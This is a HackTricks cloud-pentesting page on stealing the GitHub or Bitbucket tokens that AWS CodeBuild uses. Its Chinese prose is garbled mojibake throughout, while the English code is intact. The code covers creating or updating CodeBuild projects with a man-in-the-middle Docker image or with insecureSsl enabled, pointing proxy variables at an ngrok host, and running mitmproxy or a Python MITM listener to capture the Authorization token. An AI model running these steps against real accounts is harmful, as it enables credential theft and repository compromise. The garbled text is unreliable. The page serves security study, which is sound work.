# AWS Codebuild - Token Leakage

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## æ¢å¤ Github/Bitbucket é…ç½®çš„ä»¤ç‰Œ

é¦–å…ˆï¼Œæ£€æŸ¥æ˜¯å¦é…ç½®äº†ä»»ä½•æºå‡­æ®ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥æ³„éœ²ï¼š
```bash
aws codebuild list-source-credentials
```
### é€šè¿‡ Docker é•œåƒ

å¦‚æœä½ å‘ç°ä¾‹å¦‚ Github çš„è®¤è¯å·²åœ¨è´¦æˆ·ä¸­è®¾ç½®ï¼Œä½ å¯ä»¥é€šè¿‡è®© Codebuild **ä½¿ç”¨ç‰¹å®šçš„ docker é•œåƒ** æ¥ **æå–** è¯¥ **è®¿é—®** ï¼ˆ**GH token æˆ– OAuth token**ï¼‰ã€‚

ä¸ºæ­¤ï¼Œä½ å¯ä»¥ **åˆ›å»ºä¸€ä¸ªæ–°çš„ Codebuild é¡¹ç›®** æˆ–æ›´æ”¹ç°æœ‰é¡¹ç›®çš„ **ç¯å¢ƒ** ä»¥è®¾ç½® **Docker é•œåƒ**ã€‚

ä½ å¯ä»¥ä½¿ç”¨çš„ Docker é•œåƒæ˜¯ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„ Docker é•œåƒï¼Œå°†è®¾ç½® **ç¯å¢ƒå˜é‡ `https_proxy`**ã€**`http_proxy`** å’Œ **`SSL_CERT_FILE`**ã€‚è¿™å°†å…è®¸ä½ æ‹¦æˆªåœ¨ **`https_proxy`** å’Œ **`http_proxy`** ä¸­æŒ‡ç¤ºçš„ä¸»æœºçš„å¤§éƒ¨åˆ†æµé‡ï¼Œå¹¶ä¿¡ä»»åœ¨ **`SSL_CERT_FILE`** ä¸­æŒ‡ç¤ºçš„ SSL è¯ä¹¦ã€‚

1. **åˆ›å»ºå¹¶ä¸Šä¼ ä½ è‡ªå·±çš„ Docker MitM é•œåƒ**
* æŒ‰ç…§ä»“åº“çš„è¯´æ˜è®¾ç½®ä½ çš„ä»£ç† IP åœ°å€å¹¶è®¾ç½®ä½ çš„ SSL è¯ä¹¦ï¼Œç„¶å **æ„å»º docker é•œåƒ**ã€‚
* **ä¸è¦è®¾ç½® `http_proxy`** ä»¥é¿å…æ‹¦æˆªå¯¹å…ƒæ•°æ®ç«¯ç‚¹çš„è¯·æ±‚ã€‚
* ä½ å¯ä»¥ä½¿ç”¨ **`ngrok`**ï¼Œä¾‹å¦‚ `ngrok tcp 4444` æ¥å°†ä»£ç†è®¾ç½®ä¸ºä½ çš„ä¸»æœºã€‚
* ä¸€æ—¦ä½ æ„å»ºäº† Docker é•œåƒï¼Œ**å°†å…¶ä¸Šä¼ åˆ°å…¬å…±ä»“åº“**ï¼ˆDockerhub, ECR...ï¼‰ã€‚
2. **è®¾ç½®ç¯å¢ƒ**
* åˆ›å»ºä¸€ä¸ª **æ–°çš„ Codebuild é¡¹ç›®** æˆ– **ä¿®æ”¹** ç°æœ‰é¡¹ç›®çš„ç¯å¢ƒã€‚
* è®¾ç½®é¡¹ç›®ä½¿ç”¨ **ä¹‹å‰ç”Ÿæˆçš„ Docker é•œåƒ**ã€‚

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **åœ¨ä½ çš„ä¸»æœºä¸Šè®¾ç½® MitM ä»£ç†**

* å¦‚ **Github ä»“åº“** ä¸­æ‰€ç¤ºï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„å‘½ä»¤ï¼š
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
ä½¿ç”¨çš„ **mitmproxy ç‰ˆæœ¬æ˜¯ 9.0.1**ï¼Œæ®æŠ¥é“åœ¨ç‰ˆæœ¬ 10 ä¸­è¿™å¯èƒ½æ— æ³•å·¥ä½œã€‚
{% endhint %}

4. **è¿è¡Œæ„å»ºå¹¶æ•è·å‡­è¯**

*   æ‚¨å¯ä»¥åœ¨ **Authorization** å¤´ä¸­çœ‹åˆ°ä»¤ç‰Œï¼š

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

è¿™ä¹Ÿå¯ä»¥é€šè¿‡ aws cli ä»¥ç±»ä¼¼çš„æ–¹å¼å®Œæˆ

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### é€šè¿‡ insecureSSL

**Codebuild** é¡¹ç›®æœ‰ä¸€ä¸ªè®¾ç½®å«åš **`insecureSsl`**ï¼Œè¿™ä¸ªè®¾ç½®åœ¨ç½‘é¡µä¸Šæ˜¯éšè—çš„ï¼Œä½ åªèƒ½é€šè¿‡ API æ¥æ›´æ”¹å®ƒã€‚\
å¯ç”¨æ­¤é€‰é¡¹ï¼Œå…è®¸ Codebuild è¿æ¥åˆ°å­˜å‚¨åº“ **è€Œä¸æ£€æŸ¥** å¹³å°æä¾›çš„è¯ä¹¦ã€‚

* é¦–å…ˆï¼Œä½ éœ€è¦ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„å‘½ä»¤æ¥æšä¸¾å½“å‰é…ç½®ï¼š
```bash
aws codebuild batch-get-projects --name <proj-name>
```
* ç„¶åï¼Œä½¿ç”¨æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥å°†é¡¹ç›®è®¾ç½® **`insecureSsl`** æ›´æ–°ä¸º **`True`**ã€‚ä»¥ä¸‹æ˜¯æˆ‘æ›´æ–°é¡¹ç›®çš„ç¤ºä¾‹ï¼Œè¯·æ³¨æ„æœ€åçš„ **`insecureSsl=True`**ï¼ˆè¿™æ˜¯æ‚¨éœ€è¦ä»æ”¶é›†çš„é…ç½®ä¸­æ›´æ”¹çš„å”¯ä¸€å†…å®¹ï¼‰ã€‚
* æ­¤å¤–ï¼Œè¿˜è¦æ·»åŠ ç¯å¢ƒå˜é‡ **http\_proxy** å’Œ **https\_proxy**ï¼ŒæŒ‡å‘æ‚¨çš„ tcp ngrokï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 

{% code overflow="wrap" %}
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "https://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
{% endcode %}

* ç„¶åï¼Œåœ¨ä»£ç†å˜é‡æŒ‡å‘çš„ç«¯å£ï¼ˆhttp\_proxy å’Œ https\_proxyï¼‰è¿è¡Œæ¥è‡ª [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) çš„åŸºæœ¬ç¤ºä¾‹
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* æœ€åï¼Œç‚¹å‡» **Build the project**ï¼Œ**å‡­è¯**å°†ä»¥ **æ˜æ–‡**ï¼ˆbase64ï¼‰å‘é€åˆ° mitm ç«¯å£ï¼š

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### ~~é€šè¿‡ HTTP åè®®~~

{% hint style="success" %}
**è¿™ä¸ªæ¼æ´åœ¨ 2023 å¹´ 2 æœˆ 20 æ—¥é‚£ä¸€å‘¨çš„æŸä¸ªæ—¶å€™è¢« AWS ä¿®å¤äº†ï¼ˆæˆ‘æƒ³æ˜¯æ˜ŸæœŸäº”ï¼‰ã€‚æ‰€ä»¥æ”»å‡»è€…ä¸èƒ½å†åˆ©ç”¨å®ƒäº† :)**
{% endhint %}

å…·æœ‰ **æå‡æƒé™çš„æ”»å‡»è€…åœ¨ CodeBuild ä¸­å¯èƒ½ä¼šæ³„éœ²é…ç½®çš„ Github/Bitbucket ä»¤ç‰Œ**ï¼Œæˆ–è€…å¦‚æœæƒé™æ˜¯é€šè¿‡ OAuth é…ç½®çš„ï¼Œåˆ™ **ç”¨äºè®¿é—®ä»£ç çš„ä¸´æ—¶ OAuth ä»¤ç‰Œ**ã€‚

* æ”»å‡»è€…å¯ä»¥å°†ç¯å¢ƒå˜é‡ **http\_proxy** å’Œ **https\_proxy** æ·»åŠ åˆ° CodeBuild é¡¹ç›®ï¼ŒæŒ‡å‘ä»–çš„æœºå™¨ï¼ˆä¾‹å¦‚ `http://5.tcp.eu.ngrok.io:14972`ï¼‰ã€‚

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* ç„¶åï¼Œå°† github ä»“åº“çš„ URL æ›´æ”¹ä¸ºä½¿ç”¨ HTTP è€Œä¸æ˜¯ HTTPSï¼Œä¾‹å¦‚ï¼š`http://github.com/carlospolop-forks/TestActions`
* ç„¶åï¼Œåœ¨ä»£ç†å˜é‡ï¼ˆhttp\_proxy å’Œ https\_proxyï¼‰æŒ‡å‘çš„ç«¯å£ä¸Šè¿è¡Œæ¥è‡ª [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) çš„åŸºæœ¬ç¤ºä¾‹ã€‚
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* æœ€åï¼Œç‚¹å‡» **Build the project**ï¼Œ**å‡­è¯**å°†ä»¥ **æ˜æ–‡**ï¼ˆbase64ï¼‰å‘é€åˆ° mitm ç«¯å£ï¼š

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ç°åœ¨æ”»å‡»è€…å°†èƒ½å¤Ÿä»ä»–çš„æœºå™¨ä¸Šä½¿ç”¨ä»¤ç‰Œï¼Œåˆ—å‡ºå®ƒæ‹¥æœ‰çš„æ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”æ¯”ç›´æ¥ä½¿ç”¨ CodeBuild æœåŠ¡æ›´å®¹æ˜“ï¼ˆæ»¥ç”¨ï¼‰ã€‚
{% endhint %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
